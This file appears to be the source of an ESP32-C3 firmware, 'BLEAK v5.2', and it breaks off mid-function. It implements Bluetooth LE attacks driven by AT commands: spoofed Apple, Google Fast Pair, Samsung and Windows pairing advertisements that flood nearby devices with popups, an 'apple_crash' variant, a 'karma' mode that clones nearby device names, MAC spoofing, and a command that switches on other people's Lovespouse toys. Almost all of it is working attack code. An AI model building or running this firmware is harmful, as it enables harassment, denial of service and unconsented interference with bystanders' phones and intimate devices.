/*
 * BLEAK ESP32-C3 Firmware v5.2
 * ════════════════════════════════════════════════════════════════
 * Target chip : ESP32-C3 (single-core RISC-V, USB-CDC native)
 * BLE library  : NimBLE-Arduino (required)
 * USB port     : /dev/ttyACM0 or /dev/ttyACM1 (native CDC)
 *
 * Capabilities (C3 = BLE-only, no USB HID):
 *   BLE Spam      — Apple / Android / Samsung / Windows / All / Kitchen
 *   Karma         — impersonate nearby devices
 *   BLE Scan      — general / Fast Pair / raw
 *   Beacon        — custom name beacon + loop mode
 *   Custom ADV    — raw hex advertisement
 *   MAC Randomize — per-packet random MAC (BLEAK spoof approach)
 *   TX Power      — set 0-9 (maps to ESP-IDF power levels)
 *   RSSI Filter   — scan only above threshold
 *   Beacon Loop   — continuous beacon with configurable interval
 *
 * AT Command Reference:
 *   AT+VERSION              → OK:BLEAK-C3 v5.2 [ESP32-C3]
 *   AT+STATUS               → OK:state,pkts=N,karma=N,heap=N
 *   AT+HELP                 → OK:CMDS:...
 *   AT+SPAM=type,dur        → spam (apple/android/android_random/samsung/samsung_buds/samsung_watch/windows/kitchen/lovespouse/all)
 *   AT+STOP                 → stop spam/karma/beacon/scan
 *   AT+KARMA=dur            → start karma attack
 *   AT+KARMASTOP            → stop karma
 *   AT+SCAN=sec             → general BLE scan → DEV:MAC:RSSI:name
 *   AT+FPSCAN=sec           → Fast Pair scan → FP:MAC:RSSI:modelID:state:name
 *   AT+SCANRAW=sec          → raw scan → RAW:MAC:RSSI:0:hexPayload
 *   AT+ADV=hex              → single custom advertisement
 *   AT+BEACON=name,dur      → start named beacon (dur=0 = until AT+STOP)
 *   AT+BEACONSTOP           → stop beacon
 *   AT+BEACONLOOP=name,int  → continuous beacon, interval ms
 *   AT+MACCLONE=XX:XX:XX:XX:XX:XX → set static MAC for next ADV cycle
 *   AT+SETPOWER=0-9         → set TX power (0=min, 9=max)
 *   AT+RSSI=threshold       → set RSSI filter for scans (default -99 = all)
 *   AT+BLEENUM=MAC          → passive enumeration scan for device
 *
 * SPAM:PKT:N lines emitted during spam for real-time monitoring.
 * ════════════════════════════════════════════════════════════════
 */

#include <NimBLEDevice.h>

#define FW_VER   "BLEAK-C3 v5.2"
#define CHIP_ID  "ESP32-C3"

// ════════════════════════════════════════════════════════════════
// PAYLOADS
// ════════════════════════════════════════════════════════════════

// Apple Continuity — AirPods/Beats popups
static const uint8_t APPLE[][28] = {
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
};
#define APPLE_N 10

// Apple Action Modal
static const uint8_t APPLE_ACT[][23] = {
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x09,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x02,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x27,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0d,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x20,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x13,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
};
#define APPLE_ACT_N 7

// Google Fast Pair — known model IDs (Service Data format: 7 bytes)
// [0x06][0x16][0x2C][0xFE][model_b0][model_b1][model_b2]
// Android only shows popups for known/certified model IDs. Random IDs are kept
// as a secondary mode, but the default Android spam rotates known IDs.
static const uint8_t GFASTPAIR[][7] = {
  {0x06,0x16,0x2C,0xFE,0x10,0xC4,0x52},  // Sony WH-1000XM5
  {0x06,0x16,0x2C,0xFE,0x8B,0x66,0xAB},  // Pixel Buds Pro
  {0x06,0x16,0x2C,0xFE,0x2D,0x7A,0x23},  // Pixel Buds A
  {0x06,0x16,0x2C,0xFE,0xF5,0x24,0x94},  // Bose QC Ultra
  {0x06,0x16,0x2C,0xFE,0xCD,0x82,0x56},  // JBL Flip 6
  {0x06,0x16,0x2C,0xFE,0xD0,0xF7,0x00},  // Nothing Ear 1
  {0x06,0x16,0x2C,0xFE,0x0E,0xB4,0x00},  // JBL Tune 760NC
  {0x06,0x16,0x2C,0xFE,0xAA,0xC5,0x00},  // Galaxy Buds2
  {0x06,0x16,0x2C,0xFE,0xA5,0x9E,0xFC},  // Galaxy Buds Live
  {0x06,0x16,0x2C,0xFE,0x72,0xEF,0x22},  // Galaxy Buds Pro
};
#define GFASTPAIR_N 10

static const char* GFASTPAIR_NAMES[] = {
  "WH-1000XM4", "Pixel Buds Pro", "Pixel Buds A-Series", "Bose QC Ultra",
  "JBL Flip 6", "Nothing Ear (1)", "JBL Tune 760NC", "Galaxy Buds2",
  "Galaxy Buds Live", "Galaxy Buds Pro"
};

// Samsung — Buds Fast Pair model IDs
static const uint8_t SBUDS[][7] = {
  {0x06,0x16,0x2C,0xFE,0xA5,0x9E,0xFC},  // Galaxy Buds Live
  {0x06,0x16,0x2C,0xFE,0xAA,0xC5,0x00},  // Galaxy Buds2
  {0x06,0x16,0x2C,0xFE,0x72,0xEF,0x22},  // Galaxy Buds Pro
  {0x06,0x16,0x2C,0xFE,0x28,0x8B,0x2F},  // Galaxy Buds FE
  {0x06,0x16,0x2C,0xFE,0x6D,0x13,0x00},  // Galaxy Buds2 Pro
  {0x06,0x16,0x2C,0xFE,0x65,0xCD,0x00},  // Galaxy Buds3
};
#define SBUDS_N 6

static const char* SBUDS_NAMES[] = {
  "Galaxy Buds Live", "Galaxy Buds2", "Galaxy Buds Pro",
  "Galaxy Buds FE", "Galaxy Buds2 Pro", "Galaxy Buds3"
};

// Samsung — Watch Fast Pair model IDs
static const uint8_t SWATCH[][7] = {
  {0x06,0x16,0x2C,0xFE,0x58,0xCF,0x07},  // Galaxy Watch 4
  {0x06,0x16,0x2C,0xFE,0x58,0xCF,0x59},  // Galaxy Watch 5
  {0x06,0x16,0x2C,0xFE,0x58,0xCF,0x73},  // Galaxy Watch 5 Pro
  {0x06,0x16,0x2C,0xFE,0x58,0xCF,0x99},  // Galaxy Watch 6
};
#define SWATCH_N 4
static const char* SWATCH_NAMES[] = {
  "Galaxy Watch4", "Galaxy Watch5", "Galaxy Watch5 Pro", "Galaxy Watch6"
};

// Samsung EasySetup manufacturer data (0x0075) used by older Galaxy devices.
static const uint8_t SEASY[][27] = {
  {0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,0xef,0x74,0x5d,0x15,0x00,0x00,0x44,0x01,0x00,0x05,0x00,0x00,0x00},
  {0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,0xef,0x74,0x5d,0x16,0x00,0x00,0x44,0x01,0x00,0x05,0x00,0x00,0x00},
  {0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,0xef,0x74,0x5d,0x18,0x00,0x00,0x44,0x01,0x00,0x05,0x00,0x00,0x00},
  {0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,0xef,0x74,0x5d,0x25,0x00,0x00,0x44,0x01,0x00,0x05,0x00,0x00,0x00},
};
#define SEASY_N 4

// Microsoft Swift Pair
static const uint8_t MSFT[][7] = {
  {0x06,0xff,0x06,0x00,0x03,0x00,0x80},
  {0x06,0xff,0x06,0x00,0x03,0x00,0xc0},
  {0x06,0xff,0x06,0x00,0x03,0x00,0xa0},
};
#define MSFT_N 3
static const char* MSFT_NAMES[] = {"BT Speaker","BT Controller","BT Headphones"};

// Lovespouse adult toy control
static const uint8_t LOVE_ON[]  = {0x09,0xff,0x00,0x05,0x8f,0x53,0x00,0x00,0x64,0x01};
static const uint8_t LOVE_OFF[] = {0x09,0xff,0x00,0x05,0x8f,0x53,0x00,0x00,0x00,0x01};

// ════════════════════════════════════════════════════════════════
// STATE
// ════════════════════════════════════════════════════════════════

NimBLEAdvertising* pAdv = nullptr;

volatile bool     spamActive   = false;
volatile uint32_t pkts         = 0;
volatile uint32_t pktReport    = 0;  // last reported packet count
volatile unsigned long spamEnd = 0;
String            sType        = "";
volatile uint16_t spamIdx      = 0;

volatile bool     karmaActive  = false;
volatile int      karmaCount   = 0;
unsigned long     karmaEndMs   = 0;

volatile bool     beaconActive = false;
String            beaconName   = "";
int               beaconInterval = 200;  // ms
unsigned long     beaconEnd    = 0;
bool              beaconLoop   = false;

int8_t            rssiFilter   = -99;   // scan RSSI threshold

// Static MAC override (AT+MACCLONE)
bool              useMacClone  = false;
uint8_t           cloneMac[6]  = {0};

// TX power level (0-9)
int               txPowerLevel = 9;

// ════════════════════════════════════════════════════════════════
// FORWARD DECLARATIONS
// ════════════════════════════════════════════════════════════════

void handleCmd(String c);
void doSpamCycle();
void setRandomMac();
void setCloneMac();
void txPayload(const uint8_t* d, uint8_t len);
void txWithName(const uint8_t* d, uint8_t len, const char* name);
void txFastPairAdv(const uint8_t* fp, const char* name, bool randomMac);
void txRandomFastPair();
void txKnownFastPair();
void applyTxPower();

// ════════════════════════════════════════════════════════════════
// KARMA CALLBACK
// ════════════════════════════════════════════════════════════════

class KarmaScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override {
    if (!karmaActive) return;
    if (d->getRSSI() < rssiFilter) return;
    String name = d->haveName() ? String(d->getName().c_str()) : "";
    String addr = String(d->getAddress().toString().c_str());
    Serial.println("KARMA:SEEN:" + addr + ":" + String(d->getRSSI()) + ":" + name);
    if (name.length() > 0) {
      uint8_t buf[33];
      uint8_t nlen = min((int)name.length(), 29);
      buf[0] = nlen + 1; buf[1] = 0x09;
      memcpy(&buf[2], name.c_str(), nlen);
      setRandomMac();
      NimBLEAdvertisementData ad;
      ad.addData(buf, nlen + 2);
      pAdv->stop();
      pAdv->setAdvertisementData(ad);
      pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
      pAdv->start(); delay(40); pAdv->stop();
      karmaCount++;
      Serial.println("KARMA:CLONE:" + addr + ":" + name);
    }
  }
};

// ════════════════════════════════════════════════════════════════
// SCAN CALLBACKS
// ════════════════════════════════════════════════════════════════

class ScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override {
    if (d->getRSSI() < rssiFilter) return;
    Serial.println("DEV:" + String(d->getAddress().toString().c_str()) +
                   ":" + String(d->getRSSI()) +
                   ":" + String(d->haveName() ? d->getName().c_str() : "?"));
  }
};

class FastPairScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override {
    if (d->getRSSI() < rssiFilter) return;
    bool isFP = false;
    char modelId[7] = "??????";
    const char* pairingState = "unknown";

    if (d->haveServiceUUID()) {
      for (int i = 0; i < (int)d->getServiceUUIDCount(); i++) {
        if (d->getServiceUUID(i).equals(NimBLEUUID((uint16_t)0xFE2C))) isFP = true;
      }
    }
    if (d->haveServiceData()) {
      if (d->getServiceDataUUID().equals(NimBLEUUID((uint16_t)0xFE2C))) {
        isFP = true;
        std::string sd = d->getServiceData();
        if (sd.length() >= 3) {
          snprintf(modelId, sizeof(modelId), "%02X%02X%02X",
                   (uint8_t)sd[0], (uint8_t)sd[1], (uint8_t)sd[2]);
          pairingState = ((uint8_t)sd[0] & 0x40) ? "discoverable" : "paired_nearby";
        }
      }
    }
    if (d->haveManufacturerData()) {
      std::string md = d->getManufacturerData();
      if (md.length() >= 2) {
        uint16_t company = ((uint8_t)md[1] << 8) | (uint8_t)md[0];
        if (company == 0x00E0) {
          isFP = true;
          if (md.length() >= 5) {
            snprintf(modelId, sizeof(modelId), "%02X%02X%02X",
                     (uint8_t)md[2], (uint8_t)md[3], (uint8_t)md[4]);
            pairingState = ((uint8_t)md[2] & 0x40) ? "discoverable" : "paired_nearby";
          }
        }
      }
    }
    if (isFP) {
      Serial.println("FP:" + String(d->getAddress().toString().c_str()) +
                     ":" + String(d->getRSSI()) +
                     ":" + String(modelId) +
                     ":" + String(pairingState) +
                     ":" + String(d->haveName() ? d->getName().c_str() : "FastPairDevice"));
    }
  }
};

class RawScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override {
    if (d->getRSSI() < rssiFilter) return;
    String hexPayload = "";
    if (d->haveServiceData()) {
      std::string sd = d->getServiceData();
      NimBLEUUID uuid = d->getServiceDataUUID();
      uint16_t u16 = 0;
      if (uuid.bitSize() == 16) {
        std::string us = uuid.toString();
        if (us.length() >= 8)
          u16 = (uint16_t)strtoul(us.substr(4, 4).c_str(), NULL, 16);
      }
      uint8_t adLen = (uint8_t)(sd.length() + 3);
      char buf[8]; snprintf(buf, sizeof(buf), "%02X%02X%02X%02X", adLen, 0x16, u16 & 0xFF, (u16 >> 8) & 0xFF);
      hexPayload += String(buf);
      for (size_t i = 0; i < sd.length(); i++) { char b[3]; snprintf(b, sizeof(b), "%02X", (uint8_t)sd[i]); hexPayload += b; }
    }
    if (d->haveManufacturerData()) {
      std::string md = d->getManufacturerData();
      uint8_t adLen = (uint8_t)(md.length() + 1);
      char buf[6]; snprintf(buf, sizeof(buf), "%02X%02X", adLen, 0xFF);
      hexPayload += String(buf);
      for (size_t i = 0; i < md.length(); i++) { char b[3]; snprintf(b, sizeof(b), "%02X", (uint8_t)md[i]); hexPayload += b; }
    }
    if (hexPayload.length() > 0) {
      Serial.println("RAW:" + String(d->getAddress().toString().c_str()) +
                     ":" + String(d->getRSSI()) + ":0:" + hexPayload);
    }
  }
};

// Enumeration callback — passive scan targeting a specific device
class BleEnumScanCB : public NimBLEScanCallbacks {
public:
  String target;
  void onResult(const NimBLEAdvertisedDevice* d) override {
    String addr = String(d->getAddress().toString().c_str());
    addr.toUpperCase();
    String tgt = target; tgt.toUpperCase();
    if (tgt.length() == 0 || addr == tgt) {
      Serial.println("ENUM:" + addr + ":" + String(d->getRSSI()) +
                     ":" + String(d->haveName() ? d->getName().c_str() : "?") +
                     ":" + String(d->haveManufacturerData() ? "MD" : "") +
                     ":" + String(d->haveServiceUUID() ? d->getServiceUUID(0).toString().c_str() : ""));
    }
  }
};

// ════════════════════════════════════════════════════════════════
// SETUP
// ════════════════════════════════════════════════════════════════

void setup() {
  Serial.begin(115200);
  delay(500);
  NimBLEDevice::init("");
  applyTxPower();
  pAdv = NimBLEDevice::getAdvertising();
  Serial.println("OK:" FW_VER " [" CHIP_ID "]");
}

// ════════════════════════════════════════════════════════════════
// MAIN LOOP (C3 = single core, spam runs here)
// ════════════════════════════════════════════════════════════════

void loop() {
  // Process serial commands
  if (Serial.available()) {
    String c = Serial.readStringUntil('\n');
    c.trim();
    if (c.length()) handleCmd(c);
  }

  // BLE Spam (runs in loop on C3 — single core)
  if (spamActive) {
    if (millis() < spamEnd) {
      doSpamCycle();
      // Report packet count periodically
      if (pkts - pktReport >= 10) {
        Serial.println("SPAM:PKT:" + String(pkts));
        pktReport = pkts;
      }
    } else {
      spamActive = false;
      pAdv->stop();
      Serial.println("SPAM:DONE:" + String(pkts));
    }
  }

  // Karma watchdog
  if (karmaActive && millis() > karmaEndMs) {
    karmaActive = false;
    NimBLEDevice::getScan()->stop();
    Serial.println("KARMA:DONE:" + String(karmaCount));
  }

  // Beacon loop
  if (beaconActive && beaconLoop) {
    if (beaconEnd > 0 && millis() > beaconEnd) {
      beaconActive = false;
      pAdv->stop();
      Serial.println("BEACON:DONE");
    } else {
      // Pulse beacon
      pAdv->start();
      delay(beaconInterval);
      pAdv->stop();
      delay(beaconInterval / 2);
    }
  }

  delay(1);
}

// ════════════════════════════════════════════════════════════════
// MAC UTILITIES
// ════════════════════════════════════════════════════════════════

void setRandomMac() {
  uint8_t a[6];
  esp_fill_random(a, 6);
  a[5] = (a[5] | 0xC0) & 0xFE;  // static random + unicast
  ble_hs_id_set_rnd(a);
}

void setCloneMac() {
  if (useMacClone) {
    ble_hs_id_set_rnd(cloneMac);
  } else {
    setRandomMac();
  }
}

void applyTxPower() {
  // Map 0-9 to ESP-IDF power levels (-12 to +9 dBm)
  const esp_power_level_t levels[] = {
    ESP_PWR_LVL_N12, ESP_PWR_LVL_N9, ESP_PWR_LVL_N6, ESP_PWR_LVL_N3,
    ESP_PWR_LVL_N0,  ESP_PWR_LVL_P3, ESP_PWR_LVL_P6,
    ESP_PWR_LVL_P6,  ESP_PWR_LVL_P9, ESP_PWR_LVL_P9
  };
  int idx = constrain(txPowerLevel, 0, 9);
  NimBLEDevice::setPower(levels[idx]);
}

// ════════════════════════════════════════════════════════════════
// ADVERTISEMENT HELPERS
// ════════════════════════════════════════════════════════════════

void txPayload(const uint8_t* d, uint8_t len) {
  setCloneMac();
  NimBLEAdvertisementData ad;
  ad.addData(d, len);
  pAdv->stop();
  pAdv->setAdvertisementData(ad);
  pAdv->setScanResponseData(NimBLEAdvertisementData());
  pAdv->setMinInterval(0x20); pAdv->setMaxInterval(0x20);
  pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
  pAdv->start();
  delay(180 + random(90));
  pAdv->stop();
  pkts++;
}

void txApplePayload(const uint8_t* d, uint8_t len) {
  setRandomMac();
  NimBLEAdvertisementData ad;
  ad.addData(d, len);
  pAdv->stop();
  pAdv->setAdvertisementData(ad);
  pAdv->setScanResponseData(NimBLEAdvertisementData());
  pAdv->setMinInterval(0x20); pAdv->setMaxInterval(0x30);
  pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
  pAdv->start();
  delay(100);
  pAdv->stop();
  delay(5);
  pkts++;
}

void txWithName(const uint8_t* d, uint8_t len, const char* name) {
  setCloneMac();
  NimBLEAdvertisementData ad;
  ad.addData(d, len);
  NimBLEAdvertisementData sr;
  uint8_t nb[33]; uint8_t nl = min((int)strlen(name), 29);
  nb[0] = nl + 1; nb[1] = 0x09; memcpy(&nb[2], name, nl);
  sr.addData(nb, nl + 2);
  pAdv->stop();
  pAdv->setAdvertisementData(ad);
  pAdv->setScanResponseData(sr);
  pAdv->setMinInterval(0x20); pAdv->setMaxInterval(0x20);
  pAdv->setConnectableMode(BLE_GAP_CONN_MODE_UND);
  pAdv->start();
  delay(30 + random(20));
  pAdv->stop();
  pkts++;
}

void txFastPairAdv(const uint8_t* fp, const char* name, bool randomMac) {
  if (randomMac || !useMacClone) setRandomMac();
  else setCloneMac();

  NimBLEAdvertisementData ad;
  uint8_t flags[3] = {0x02, 0x01, 0x06};
  uint8_t svc[4]   = {0x03, 0x03, 0x2C, 0xFE};
  uint8_t txp[3]   = {0x02, 0x0A, 0x04};
  ad.addData(flags, 3);
  ad.addData(svc, 4);
  ad.addData(fp, 7);
  ad.addData(txp, 3);

  NimBLEAdvertisementData sr;
  uint8_t nb[33]; uint8_t nl = min((int)strlen(name), 29);
  nb[0] = nl + 1; nb[1] = 0x09; memcpy(&nb[2], name, nl);
  sr.addData(nb, nl + 2);

  pAdv->stop();
  pAdv->setAdvertisementData(ad);
  pAdv->setScanResponseData(sr);
  // Google Fast Pair spec: discoverable mode requires 100ms advertising interval
  pAdv->setMinInterval(0xA0); pAdv->setMaxInterval(0xA0);  // 0xA0 * 0.625ms = 100ms
  pAdv->setConnectableMode(BLE_GAP_CONN_MODE_UND);  // connectable = discoverable state
  pAdv->start();
  delay(220 + random(60));  // hold for 2+ advertising events at 100ms
  pAdv->stop();
  pkts++;
}

// Google Fast Pair spec: Service Data UUID 0xFE2C + 3-byte Model ID
// AD format: [len=6][type=0x16 Service Data][UUID=0x2C,0xFE (LE)][model_b0][model_b1][model_b2]
void txRandomFastPair() {
  uint8_t payload[7] = {0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x00};
  payload[4] = random(256); payload[5] = random(256); payload[6] = random(256);
  txFastPairAdv(payload, "Fast Pair", true);
}

void txKnownFastPair() {
  uint8_t i = spamIdx % GFASTPAIR_N;
  txFastPairAdv(GFASTPAIR[i], GFASTPAIR_NAMES[i], true);
}

// Fast Pair with specific model ID (for targeted device spoofing)
void txFastPairModel(uint8_t m0, uint8_t m1, uint8_t m2) {
  uint8_t payload[7] = {0x06, 0x16, 0x2C, 0xFE, m0, m1, m2};
  txFastPairAdv(payload, "Fast Pair", true);
}

// ════════════════════════════════════════════════════════════════
// SPAM CYCLE
// ════════════════════════════════════════════════════════════════

void doSpamCycle() {
  if (sType == "apple" || sType == "apple_popup") {
    txApplePayload(APPLE[spamIdx % APPLE_N], 28);
  } else if (sType == "apple_crash" || sType == "sourapple") {
    uint8_t crash[28]; memcpy(crash, APPLE[spamIdx % APPLE_N], 28);
    crash[7] = random(256); crash[8] = random(256);
    txApplePayload(crash, 28);
  } else if (sType == "apple_action") {
    txApplePayload(APPLE_ACT[spamIdx % APPLE_ACT_N], 23);
  } else if (sType == "android") {
    // Alternate: known model IDs (popup on first seen) + random (bypass suppression)
    // This mirrors Flipper Zero's Fast Pair spam behavior
    if (spamIdx % 4 < 3) txKnownFastPair();   // 3 out of 4: known IDs
    else txRandomFastPair();                    // 1 out of 4: random (anti-suppression)
  } else if (sType == "android_random") {
    txRandomFastPair();
  } else if (sType == "samsung" || sType == "samsung_buds") {
    // Alternate: EasySetup (legacy BT) + Fast Pair (BLE popup)
    // Both need random MAC + scan response for Samsung to show notification
    if (spamIdx % 3 == 0) txWithName(SEASY[spamIdx % SEASY_N], 27, "Galaxy Buds");
    else txFastPairAdv(SBUDS[spamIdx % SBUDS_N], SBUDS_NAMES[spamIdx % SBUDS_N], true);
  } else if (sType == "samsung_watch") {
    if (spamIdx % 3 == 0) txWithName(SEASY[3], 27, "Galaxy Watch");
    else txFastPairAdv(SWATCH[spamIdx % SWATCH_N], SWATCH_NAMES[spamIdx % SWATCH_N], true);
  } else if (sType == "windows") {
    txWithName(MSFT[spamIdx % MSFT_N], 7, MSFT_NAMES[spamIdx % MSFT_N]);
  } else if (sType == "lovespouse" || sType == "love") {
    txPayload(LOVE_ON, 10);
  } else if (sType == "lovespouse_stop" || sType == "love_stop") {
    txPayload(LOVE_OFF, 10);
  } else if (sType == "kitchen" || sType == "all") {
    // Rotate through all types
    uint8_t t = spamIdx % 5;
    if (t == 0) txApplePayload(APPLE[spamIdx % APPLE_N], 28);
    else if (t == 1) txKnownFastPair();
    else if (t == 2) txFastPairAdv(SBUDS[spamIdx % SBUDS_N], SBUDS_NAMES[spamIdx % SBUDS_N], true);
    else if (t == 3) txWithName(MSFT[spamIdx % MSFT_N], 7, MSFT_NAMES[spamIdx % MSFT_N]);
    else txFastPairAdv(SWATCH[spamIdx % SWATCH_N], SWATCH_NAMES[spamIdx % SWATCH_N], true);
  }
  spamIdx++;
}

// ════════════════════════════════════════════════════════════════
// COMMAND HANDLER
// ════════════════════════════════════════════════════════════════

void handleCmd(String c) {
  String u = c; u.toUpperCase();

  // ── Version / Status / Help ────────────────────────────────────
  if (u == "AT+VERSION") {
    Serial.println("OK:" FW_VER " [" CHIP_ID "]");
  }
  else if (u == "AT+STATUS") {
    String st = spamActive ? ("spam:" + sType) :
                beaconActive ? "beacon" :
                karmaActive  ? "karma" : "idle";
    Serial.println("OK:" + st +
                   ",pkts=" + String(pkts) +
                   ",karma=" + String(karmaCount) +
                   ",heap=" + String(ESP.getFreeHeap()) +
                   ",chip=" CHIP_ID +
                   ",power=" + String(txPowerLevel) +
                   ",rssi_filter=" + String(rssiFilter));
  }
  else if (u == "AT+HELP") {
    Serial.println("OK:CMDS:" CHIP_ID ":VERSION,STATUS,SPAM=type.dur(android/android_random/samsung),STOP,"
                   "KARMA=dur,KARMASTOP,SCAN=sec,FPSCAN=sec,SCANRAW=sec,"
                   "ADV=hex,BEACON=name.dur,BEACONSTOP,BEACONLOOP=name.int,"
                   "MACCLONE=XX:XX:XX:XX:XX:XX,SETPOWER=0-9,RSSI=threshold,"
                   "BLEENUM=MAC");
  }

  // ── BLE Spam ───────────────────────────────────────────────────
  else if (u.startsWith("AT+SPAM=")) {
    String p = c.substring(8);
    int cm = p.indexOf(',');
    sType = p.substring(0, cm > 0 ? cm : p.length());
    sType.toLowerCase();
    int dur = cm > 0 ? p.substring(cm + 1).toInt() : 30;
    dur = constrain(dur, 1, 600);
    pkts = 0; pktReport = 0; spamIdx = 0;
    spamEnd = millis() + (unsigned long)dur * 1000UL;
    spamActive = true;
    beaconActive = false;
    Serial.println("OK:SPAM:" + sType + ":" + String(dur));
  }
  else if (u == "AT+STOP") {
    spamActive   = false;
    karmaActive  = false;
    beaconActive = false;
    beaconLoop   = false;
    pAdv->stop();
    NimBLEDevice::getScan()->stop();
    Serial.println("OK:STOP:pkts=" + String(pkts) + ",karma=" + String(karmaCount));
  }

  // ── Karma ──────────────────────────────────────────────────────
  else if (u.startsWith("AT+KARMA=")) {
    int dur = constrain(c.substring(9).toInt(), 5, 600);
    karmaActive = true; karmaCount = 0;
    karmaEndMs  = millis() + (unsigned long)dur * 1000UL;
    auto* sc = NimBLEDevice::getScan();
    sc->setScanCallbacks(new KarmaScanCB(), false);
    sc->setActiveScan(true); sc->setInterval(100); sc->setWindow(99);
    sc->start(dur, false);
    Serial.println("OK:KARMA:" + String(dur));
  }
  else if (u == "AT+KARMASTOP") {
    karmaActive = false;
    NimBLEDevice::getScan()->stop();
    Serial.println("OK:KARMASTOP:" + String(karmaCount));
  }

  // ── BLE Scan ───────────────────────────────────────────────────
  else if (u.startsWith("AT+SCAN=")) {
    int s = constrain(c.substring(8).toInt(), 1, 60);
    auto* sc = NimBLEDevice::getScan();
    sc->setScanCallbacks(new ScanCB(), false);
    sc->setActiveScan(true); sc->setInterval(100); sc->setWindow(99);
    Serial.println("OK:SCAN:" + String(s));
    sc->start(s, false);
    Serial.println("OK:SCANDONE");
  }
  else if (u.startsWith("AT+FPSCAN=")) {
    int s = constrain(c.substring(10).toInt(), 1, 60);
    auto* sc = NimBLEDevice::getScan();
    sc->setScanCallbacks(new FastPairScanCB(), false);
    sc->setActiveScan(true); sc->setInterval(80); sc->setWindow(79);
    Serial.println("OK:FPSCAN:" + String(s));
    sc->start(s, false);
    Serial.println("OK:FPSCANDONE");
  }
  else if (u.startsWith("AT+SCANRAW=")) {
    int s = constrain(c.substring(11).toInt(), 1, 60);
    auto* sc = NimBLEDevice::getScan();
    sc->setScanCallbacks(new RawScanCB(), false);
    sc->setActiveScan(true); sc->setInterval(100); sc->setWindow(99);
    Serial.println("OK:SCANRAW:" + String(s));
    sc->start(s, false);
    Serial.println("OK:SCANRAWDONE");
  }
  else if (u.startsWith("AT+BLEENUM=")) {
    // Passive enumeration scan targeting a specific device
    String target = c.substring(11); target.trim();
    int s = 8;
    auto* sc = NimBLEDevice::getScan();
    BleEnumScanCB* cb = new BleEnumScanCB();
    cb->target = target;
    sc->setScanCallbacks(cb, false);
